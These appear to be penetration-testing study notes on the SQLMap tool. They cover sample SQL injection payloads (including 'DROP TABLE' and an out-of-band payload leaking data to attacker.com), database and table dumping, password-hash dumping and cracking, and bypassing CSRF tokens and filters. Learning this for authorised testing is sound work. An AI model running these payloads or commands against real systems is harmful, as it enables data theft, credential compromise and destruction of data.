# SQLMap Overview
--------

- SQLMap is a common tool that is used for automating the process of detecting and exploiting SQL Injection vulnerabilities.

- Installation
```bash
sudo apt install sqlmap
```

- Confirm the installation
```bash
python sqlmap.py
```

## Supported Databases
SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

![image](https://github.com/user-attachments/assets/1dc59c09-bb5c-40a7-b65b-170cf47ca823)

## Supported SQL Injection Types
- SQLMap supports the following types of SQL Injection:
	- B: Boolean-based blind `AND 1=1`
	- E: Error-based `AND GTID_SUBSET(@@version,0)`
	- U: Union query-based `UNION ALL SELECT 1, @@version,3`
	- S: Stacked queries `;DROP TABLE users`
	- T: Time-based blind `AND 1=IF(2>1,SLEEP(5),0)`
	- Q: Inline queries `SELECT (SELECT @@version) from`
	- Out-of-band SQL Injection `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\README.txt'))`

# Running SQLMap on an HTTP Request
-----

## curl command
- `sqlmap` command can be used like `curl` command to request a page
```bash
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

## GET/POST Requests
- GET requests' parameters are specified in the URL, so it should be easy to use sqlmap with GET request.

- POST requests can use `--data` flag to specify the parameters
```bash
sqlmap "https://example.com" --data "uid=1&name=test"
```

- The aboce sqlmap command will test both parameters `uid` and `name` for vulnerability. If we only want to test the `uid` field, we can modify the command
```bash
sqlmap "https://example.com" --data "uid=1*&name=test"
```

## Full HTTP Requests
- sqlmap can also run a full HTTP request from a text file.
1. Go to BurpSuite and intercept the GET request. Save the request in a text file
2. In the terminal, run:
```bash
sqlmap -r request.txt
```

## Custom SQLMap Requests
- Headers
```bash
sqlmap <SNIP>... -H="Cookie:PHPSESSID=fajklh31ljglska"
```

- Cookies
```bash
sqlmap <SNIP> ... --cookie="PHPSESSID=lksva83lkfqj"
```

- Randomize User Agent
```bash
sqlmap <SNIP> ... --random-agent
```

- HTTP Method
```bash
sqlmap <SNIP> ... --method PUT
```

# Handling SQLMap Errors

- Display Errors: Use the `--parse-errors` flag. This will give us clarity on what the issue we may encounter.

```bash
...SNIP...
[16:09:20] [INFO] testing if GET parameter 'id' is dynamic
[16:09:20] [INFO] GET parameter 'id' appears to be dynamic
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'"
[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'
...SNIP...
```

- Store the traffic: use the `-t` option
```bash
sqlmap ...SNIP... --batch -t /tmp/traffic.txt
```

- Verbose Output: use `-v` option
```bash
sqlmap ...SNIP... -v 6 --batch
```

# Attack Tuning

- Every payload consists of 2 parts: vector and boundaries.
	- vector (`UNION ALL SELECT 1,2,VERSION()`): carry the SQL code to be executed
	- boundaries ('$VECTOR-- -): prefix and suffix formations that are added to the vector

### Prefix/Suffix
- Enclose all vectors with values with static values

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

- If we have a vector `UNION ALL SELECT 1,2,VERSION()`, the resulting payload should look like this `%'))UNION ALL SELECT 1,2,VERSION()-- -`

### Level/Risk
- The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).

- The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

- To tell the differences between the levels and the risks, use `-v 3`

# Enumeration

### Basic DB Enumeration
- We can use multiple flags to retrieve the information about the target's DB.

```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

--banner: Database version
--current-user: current username
--current-db: current database name
--is-dba: check if the current user has admin rights.


**Note**: A lot of time, we encounter user 'root' from enumeration. This 'root' user is completely different from the OS user 'root'.

### Tables Enumeration

```bash
sqlmap -u "https://example.com/?id=1" --tables -D $DB_NAME
```
--tables: dump all the table in the DB

### Users Enumeration

```bash
sqlmap -u "https://example.com/?id=1" --dump -T $TABLE_NAME -D $DB_NAME
```

--dump: retrieve all contents of the specified table
-T: specify the table name

### Table/Rows Enumeration

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

-C: specify the column name(s)

- To narrow down the output, use `--start` and `--stop`

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname --start=2 --stop=3
```

--start=2: start at the second entry
--stop=3: stop at the third entry

### Coditional Enumeration

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

### Full DB Enumeration
- Use `--dump` to retrieve all the table in the database.
- Use `--dump-all` to retrieve all the content of all databases.


### DB Schema Enumeration

```bash
sqlmap -u "https://example.com/?id=1" --schema
```

### Searching for Data

```bash
sqlmap -u "https://example.com/?id=1" --search -T user
```

--search: perform search operations for any databases, rows or columns.

### Password Enumeration & Cracking
- Once we have identified the table containing passwords, we can run a regular sqlmap command and it will automatically crack the hashes

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

### DB Users Password Enumeration & Cracking
- Beside the applications' users, we are also interested in the DB users. Hence, we need to enumerate them and crack their passwords.

```bash
sqlmap -u "https://example.com/?id=1" --passwords --batch
```

--passwords: dump the content of system tables containing Database-specific credentials.
--batch: ignore all the prompts that require users' inpu while sqlmap is running.

# Bypass Web Application Protections
-----

### Anti-CSRF Token Bypass
- SQLMap will automatically attempt to bypass the protection.

```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

--csrf-token: specify the token parameter name

### Unique Value Bypass
- Instead of using csrf-token, some web applications use unique value for each of the requests. We can use `--randomize` flag to bypass it.

```bash
sqlmap -u "https://www.example.com/?id=1&rp=8421" --randomize=rp --batch -v 5 | grep URI
```

--randomize: specify the parameter `rp`, whose value needs to be unique.

### Calculated Parameter Bypass
- A lot of applications use MD5 hash to hash certains values of parameter. We can use `--eval` flag to perform such task

```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

--eval: evaluate the hash function before sending the request. In this case, it is the id that will be hashed.

### Tamper script
- One of the most popular tamper scripts between is replacing all occurrences of greater than operator (>) with NOT BETWEEN 0 AND #, and the equals operator (=) with BETWEEN # AND #. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes (`--tamper=between,randomcase`)
- To view the list of tamper script, use `--list-tampers`


# Table of Content
-----
- [Running SQLMap on an HTTP Request](Running%20SQLMap%20on%20an%20HTTP%20Request.md)
- [Handling SQLMap Errors](Handling%20SQLMap%20Errors.md)
- [Attack Tuning](Attack%20Tuning.md)
- [SQLMap Enumeration](SQLMap%20Enumeration.md)
- [Bypass Web Application Protections](Bypass%20Web%20Application%20Protection.md)
- [OS Exploitation](OS%20Exploitation.md)
